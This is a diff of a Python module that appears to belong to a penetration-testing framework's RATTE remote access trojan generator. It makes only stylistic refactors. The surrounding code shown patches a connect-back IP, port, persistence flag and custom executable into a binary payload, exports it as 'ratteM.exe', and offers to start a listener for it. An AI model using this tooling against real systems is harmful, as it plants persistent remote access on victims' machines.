@@ -46,11 +46,7 @@ def prepare_ratte(ipaddr, ratteport, persistent, customexe):
         r_port = (len(str(ratteport)) + 1) * "Y"
         pers = (len(str(persistent)) + 1) * "Z"
         # check ob cexe > 0, sonst wird ein Feld gepatcht (falsch!)
-        if customexe:
-            cexe = (len(str(customexe)) + 1) * "Q"
-        else:
-            cexe = ""
-
+        cexe = (len(str(customexe)) + 1) * "Q" if customexe else ""
         filewrite.write(data.replace(cexe, customexe + "\x00", 1).replace(pers, persistent + "\x00", 1).replace(host, ipaddr + "\x00", 1).replace(r_port, str(ratteport) + "\x00", 1))
 
         # filewrite.write(data.replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )
@@ -68,7 +64,7 @@ def main():
     # get User Input
     #################
     # ipaddr=input(setprompt(["9", "2"], "IP address to connect back on"))
-    while valid_ip != True and input_counter < 3:
+    while not valid_ip and input_counter < 3:
         ipaddr = input(core.setprompt(["9", "2"], "Enter the IP address to connect back on"))
         valid_ip = core.validate_ip(ipaddr)
         if not valid_ip:
@@ -108,10 +104,10 @@ def main():
     while not valid_response:
         persistent = input(core.setprompt(["9", "2"], "Should RATTE be persistent [no|yes]?"))
         persistent = str.lower(persistent)
-        if persistent == "no" or persistent == "n":
+        if persistent in ["no", "n"]:
             persistent = "NO"
             valid_response = True
-        elif persistent == "yes" or persistent == "y":
+        elif persistent in ["yes", "y"]:
             persistent = "YES"
             valid_response = True
         else:
@@ -126,7 +122,9 @@ def main():
     ############
     prepare_ratte(ipaddr, ratteport, persistent, customexe)
 
-    core.print_status("Payload has been exported to %s" % os.path.join(core.userconfigpath, "ratteM.exe"))
+    core.print_status(
+        f'Payload has been exported to {os.path.join(core.userconfigpath, "ratteM.exe")}'
+    )
 
     ###################
     # start ratteserver
@@ -139,12 +137,12 @@ def main():
     while not valid_response:
         prompt = input(core.setprompt(["9", "2"], "Start the ratteserver listener now [yes|no]"))
         prompt = str.lower(prompt)
-        if prompt == "no" or prompt == "n":
+        if prompt in ["no", "n"]:
             # prompt = "NO"
             core.print_error("Aborting...")
             sleep(2)
             valid_response = True
-        elif prompt == "yes" or prompt == "y":
+        elif prompt in ["yes", "y"]:
             core.print_info("Starting ratteserver...")
             ratte_listener_start(ratteport)
             core.print_info("Stopping ratteserver...")
